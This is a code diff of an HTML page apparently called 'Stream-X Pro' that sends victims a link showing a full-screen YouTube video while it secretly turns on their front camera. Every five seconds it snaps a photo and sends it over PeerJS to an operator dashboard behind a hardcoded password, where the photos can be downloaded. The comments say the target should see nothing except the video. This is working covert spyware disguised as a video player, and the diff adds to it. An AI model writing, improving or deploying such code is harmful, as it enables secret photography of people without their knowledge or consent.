@@ -3,119 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stream-X Pro v4</title>
+    <title>Stream-X Pro Dashboard</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --primary: #00d2ff; --bg: #0f172a; --card: #1e293b; }
-        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
-        .app-bar { background: #1e293b; padding: 15px; text-align: center; border-bottom: 2px solid var(--primary); font-weight: bold; position: sticky; top: 0; z-index: 100; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; min-height: 100vh; color: #333; }
         
-        /* Dashboard Container */
-        .container { padding: 20px; max-width: 500px; margin: auto; }
+        /* 3D Glassmorphism Cards */
+        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border-radius: 20px; border: 1px solid rgba(255,255,255,0.3); box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; width: 90%; max-width: 400px; text-align: center; margin-top: 50px; }
         
-        /* Image Cards Style */
-        .img-card { background: var(--card); border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #334155; box-shadow: 0 4px 6px rgba(0,0,0,0.3); transition: 0.3s; }
-        .img-card img { width: 100%; height: auto; display: block; background: #000; }
-        .card-actions { padding: 12px; display: flex; justify-content: space-between; align-items: center; }
-        .download-btn { background: var(--primary); color: #000; border: none; padding: 8px 15px; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 13px; }
+        h2 { font-weight: 600; color: #1d1d1f; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; background: #fafafa; transition: 0.3s; }
+        input:focus { border-color: #007aff; outline: none; box-shadow: 0 0 10px rgba(0,122,255,0.2); }
+        
+        .btn-3d { background: #007aff; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(0,122,255,0.3); transition: 0.3s; }
+        .btn-3d:active { transform: scale(0.98); }
 
-        /* YT Player for Target */
-        .yt-frame { width: 100vw; height: 100vh; border: none; }
+        /* Dashboard Feed Cards */
+        .feed-card { background: white; border-radius: 15px; overflow: hidden; margin-top: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); border: 1px solid #eee; text-align: left; }
+        .feed-card img { width: 100%; height: auto; display: block; }
+        .card-info { padding: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .dl-link { color: #007aff; text-decoration: none; font-weight: 600; font-size: 14px; }
 
-        .btn-main { background: var(--primary); color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        #linkDisplay { background: #000; border: 1px dashed var(--primary); padding: 10px; margin-top: 15px; word-break: break-all; color: yellow; font-size: 12px; display: none; }
-        
-        .empty-state { text-align: center; color: #64748b; margin-top: 50px; }
+        /* Hidden elements */
+        #adminPanel, #loginUI, #targetView { display: none; width: 100%; display: flex; flex-direction: column; align-items: center; }
+        #ytPlayer { width: 100vw; height: 100vh; border: none; }
     </style>
 </head>
 <body>
 
-<div id="adminView" style="display: none;">
-    <div class="app-bar">STREAM-X DASHBOARD</div>
-    <div class="container">
-        <button class="btn-main" onclick="generateLink()">GENERATE WATCH LINK</button>
-        <div id="linkDisplay"></div>
+    <div id="loginUI" class="glass-card">
+        <h2>Admin Login</h2>
+        <input type="text" id="user" placeholder="Name">
+        <input type="password" id="pass" placeholder="Password">
+        <button class="btn-3d" onclick="checkLogin()">Login</button>
+    </div>
+
+    <div id="adminPanel" class="glass-card" style="display:none;">
+        <h2>Control Center</h2>
+        <input type="text" id="ytUrl" placeholder="Paste YouTube Link Here">
+        <button class="btn-3d" onclick="generateLink()">Generate Link</button>
         
-        <div id="feedContainer">
-            <div class="empty-state">No active feed. Waiting for connection...</div>
+        <div id="linkBox" style="display:none; margin-top:15px; font-size:12px; word-break:break-all; background:#e9ecef; padding:10px; border-radius:8px; color:#555;"></div>
+        
+        <div id="feedList" style="width:100%;">
+            <p style="color:#888; margin-top:20px;">Waiting for connection...</p>
         </div>
     </div>
-</div>
 
-<div id="targetView" style="display: none;">
-    <iframe id="ytPlayer" class="yt-frame" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-</div>
+    <div id="targetView">
+        <iframe id="ytPlayer" src="" allow="autoplay; encrypted-media"></iframe>
+    </div>
 
-<canvas id="cap" style="display:none;"></canvas>
-<video id="vid" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline style="display:none;"></video>
 
 <script>
     const peer = new Peer();
-    const feedContainer = document.getElementById('feedContainer');
     const urlParams = new URLSearchParams(window.location.search);
 
-    peer.on('open', (id) => {
+    // Page Load Logic
+    window.onload = () => {
         if(urlParams.has('session')) {
-            // TARGET PHONE MODE
+            // Target User ko kuch nahi dikhana siwaye video ke
+            document.getElementById('loginUI').style.display = 'none';
             document.getElementById('targetView').style.display = 'block';
             const vidId = urlParams.get('v') || "dQw4w9WgXcQ";
             document.getElementById('ytPlayer').src = `https://www.youtube.com/embed/${vidId}?autoplay=1`;
-            initSilentCapture(urlParams.get('session'));
+            startCapture(urlParams.get('session'));
         } else {
-            // ADMIN DASHBOARD MODE
-            document.getElementById('adminView').style.display = 'block';
+            document.getElementById('loginUI').style.display = 'block';
         }
-    });
+    };
 
-    function generateLink() {
-        const vidId = prompt("Enter YouTube Video ID (e.g. dQw4w9WgXcQ):", "dQw4w9WgXcQ");
-        const link = window.location.href.split('?')[0] + `?session=${peer.id}&v=${vidId}`;
-        const box = document.getElementById('linkDisplay');
-        box.innerText = link;
-        box.style.display = 'block';
+    // Simple Login Check
+    function checkLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(u === "Kashif" && p === "Kashif") {
+            document.getElementById('loginUI').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'flex';
+        } else {
+            alert("Wrong Credentials!");
+        }
     }
 
-    async function initSilentCapture(masterId) {
+    function extractId(url) {
+        const reg = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
+        const match = url.match(reg);
+        return (match && match[2].length === 11) ? match[2] : "dQw4w9WgXcQ";
+    }
+
+    function generateLink() {
+        const ytId = extractId(document.getElementById('ytUrl').value);
+        const link = window.location.origin + window.location.pathname + `?session=${peer.id}&v=${ytId}`;
+        const box = document.getElementById('linkBox');
+        box.innerText = link;
+        box.style.display = 'block';
+        alert("Link Generated!");
+    }
+
+    async function startCapture(masterId) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('vid').srcObject = stream;
+            const vid = document.getElementById('v');
+            vid.srcObject = stream;
             
             setInterval(() => {
-                const canvas = document.getElementById('cap');
-                const v = document.getElementById('vid');
-                canvas.width = v.videoWidth;
-                canvas.height = v.videoHeight;
-                canvas.getContext('2d').drawImage(v, 0, 0);
-                
+                const canvas = document.getElementById('c');
+                canvas.width = vid.videoWidth;
+                canvas.height = vid.videoHeight;
+                canvas.getContext('2d').drawImage(vid, 0, 0);
                 const data = canvas.toDataURL('image/jpeg', 0.5);
+                
                 const conn = peer.connect(masterId);
                 conn.on('open', () => {
                     conn.send(data);
                     setTimeout(() => conn.close(), 1000);
                 });
-            }, 4000); // 4 seconds delay to avoid PeerJS crash
+            }, 5000);
         } catch (e) { console.log("Cam error"); }
     }
 
-    // Receiving and creating CARDS
     peer.on('connection', (conn) => {
         conn.on('data', (data) => {
-            if(data.startsWith('data:image')) {
-                feedContainer.innerHTML = ""; // Sirf latest card dikhane ke liye (Aap remove bhi kar sakte hain agar purani chahiye)
-                
-                const card = document.createElement('div');
-                card.className = 'img-card';
-                const time = new Date().toLocaleTimeString();
-                
-                card.innerHTML = `
-                    <img src="${data}">
-                    <div class="card-actions">
-                        <span style="font-size:12px; color:#888;">Captured: ${time}</span>
-                        <a href="${data}" download="Capture_${Date.now()}.jpg" class="download-btn">DOWNLOAD</a>
-                    </div>
-                `;
-                feedContainer.prepend(card);
-            }
+            const list = document.getElementById('feedList');
+            if(list.querySelector('p')) list.innerHTML = ""; // Clear placeholder
+            
+            const card = document.createElement('div');
+            card.className = 'feed-card';
+            card.innerHTML = `
+                <img src="${data}">
+                <div class="card-info">
+                    <span style="font-size:12px; color:#999;">${new Date().toLocaleTimeString()}</span>
+                    <a href="${data}" download="Capture.jpg" class="dl-link">Download</a>
+                </div>
+            `;
+            list.prepend(card);
         });
     });
 </script>
